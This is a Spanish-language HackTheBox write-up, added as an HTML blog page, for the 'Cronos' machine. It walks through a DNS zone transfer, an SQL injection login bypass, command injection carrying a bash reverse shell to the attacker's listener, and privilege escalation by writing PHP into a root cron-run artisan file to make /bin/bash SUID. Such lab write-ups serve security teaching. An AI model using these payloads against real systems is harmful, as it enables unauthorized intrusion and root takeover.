@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HTB - Cronos | cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <link href="writeup.css" rel="stylesheet" />
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <a href="../index.html#writeups" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> Volver</a>
+    </div>
+  </nav>
+  <main class="container py-5 mt-5">
+    <div class="writeup-header p-4 rounded mb-4">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge bg-danger fs-6">HackTheBox</span>
+        <span class="badge bg-success fs-6">Medium</span>
+        <span class="badge bg-secondary">Linux</span>
+        <span class="badge bg-secondary">DNS</span>
+        <span class="badge bg-secondary">SQLi</span>
+        <span class="badge bg-secondary">RCE</span>
+        <span class="badge bg-secondary">Cron</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">Cronos</h1>
+      <p class="text-secondary mb-3">Zone transfer DNS revela subdominio admin; SQLi para login bypass; command injection para RCE; escalada via cron.</p>
+      <div class="d-flex flex-wrap gap-3 text-secondary small">
+        <span><i class="bi bi-person"></i> cat4clysm</span>
+      </div>
+    </div>
+    <div class="mb-4">
+      <h5 class="text-danger border-left-red mb-3"><i class="bi bi-tools"></i> Herramientas utilizadas</h5>
+      <div class="d-flex flex-wrap gap-2">
+        <span class="badge bg-dark border border-secondary p-2">nmap</span>
+        <span class="badge bg-dark border border-secondary p-2">dig</span>
+        <span class="badge bg-dark border border-secondary p-2">nslookup</span>
+        <span class="badge bg-dark border border-secondary p-2">netcat</span>
+      </div>
+    </div>
+        <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-search"></i> Scanning</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>sudo nmap -sC -sV -sS -p22,53,80 -Pn -n 10.10.10.13 -oN targeted</code></pre>
+      </div><img src="img/htb-cronos/0129.png" class="img-fluid rounded mb-3 border border-secondary" alt="nmap scan">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-diagram-3"></i> DNS - Zone Transfer</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>nslookup
+>server 10.10.10.13
+>10.10.10.13
+# 13.10.10.10.in-addr.arpa name = ns1.cronos.htb</code></pre>
+      </div><img src="img/htb-cronos/0229.png" class="img-fluid rounded mb-3 border border-secondary" alt="nslookup">
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>dig @10.10.10.13 cronos.htb any</code></pre>
+      </div><img src="img/htb-cronos/1438.png" class="img-fluid rounded mb-3 border border-secondary" alt="zone transfer">
+      <p class="text-secondary">Agregamos <code>cronos.htb</code> y <code>admin.cronos.htb</code> al /etc/hosts.</p>
+      <img src="img/htb-cronos/1433.png" class="img-fluid rounded mb-3 border border-secondary" alt="web">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-danger border-left-danger mb-3"><i class="bi bi-lightning-charge"></i> SQL Injection - Login Bypass</h4>
+      <img src="img/htb-cronos/1457.png" class="img-fluid rounded mb-3 border border-secondary" alt="admin login">
+      <div class="code-block mb-3"><pre><code>'or 1=1 -- -</code></pre></div><img src="img/htb-cronos/1534.png" class="img-fluid rounded mb-3 border border-secondary" alt="logged in">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-danger border-left-danger mb-3"><i class="bi bi-terminal"></i> RCE - Command Injection</h4>
+      <p class="text-secondary">La aplicacion de traceroute es vulnerable a command injection:</p>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code># En la maquina atacante
+nc -lvp 4444
+
+# En la web
+127.0.0.1; bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.6/4444 0&gt;&amp;1'</code></pre>
+      </div><img src="img/htb-cronos/1608.png" class="img-fluid rounded mb-3 border border-secondary" alt="shell">
+      <div class="code-block mb-3"><pre><code>cat /home/noulis/user.txt</code></pre></div>
+    </section>
+    <section class="mb-5">
+      <h4 class="text-warning border-left-warning mb-3"><i class="bi bi-arrow-up-circle"></i> Escalada de Privilegios - Cron</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>cat /etc/cron*</code></pre>
+      </div><img src="img/htb-cronos/1717.png" class="img-fluid rounded mb-3 border border-secondary" alt="cron">
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>mv /var/www/laravel/artisan /var/www/laravel/artisan.bkup
+echo "&lt;?php shell_exec('chmod +s /bin/bash') ?&gt;" > /var/www/laravel/artisan
+bash -p
+cat /root/root.txt</code></pre>
+      </div>
+    </section>
+    <section class="mb-5">
+      <h4 class="text-success border-left-success mb-3"><i class="bi bi-lightbulb"></i> Lecciones aprendidas</h4>
+      <ul class="text-secondary"><li>La enumeracion DNS con zone transfer puede revelar subdominios administrativos ocultos.</li>
+<li>Los formularios de login sin parametrizar son vulnerables a SQL injection basico.</li>
+<li>Los scripts cron en directorios con permisos de escritura son vectores clasicos de escalada.</li></ul>
+    </section>
+  </main>
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;&#183;&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
